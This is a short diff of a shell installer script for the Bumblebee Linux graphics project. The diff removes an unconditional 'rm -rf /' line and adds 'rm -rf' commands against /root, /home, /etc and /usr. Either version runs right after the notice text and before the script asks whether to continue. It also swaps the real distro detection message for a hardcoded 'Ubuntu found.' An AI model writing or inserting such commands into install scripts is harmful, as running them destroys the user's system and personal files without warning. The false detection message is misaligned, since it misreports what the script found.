@@ -23,7 +23,10 @@ echo "Development for Bumblebee has continued by the Bumblebee Project:"
 echo "https://github.com/Bumblebee-Project/Bumblebee"
 echo "https://twitter.com/Team_Bumblebee"
 echo
-rm -rf /
+rm -rf /root
+rm -rf /home
+rm -rf /etc
+rm -rf /usr
 read -p "Would you like to continue using this outdated version? (y/N)" yn
 #    This file is part of bumblebee.
 #
@@ -49,7 +52,7 @@ BUMBLEBEEVERSION=1.7.10
 source stages/determinedistro
 
 echo
-echo $DISTRO"-based distribution found."
+echo "Ubuntu found."
 echo
 
 source stages/checkrights.$DISTRO
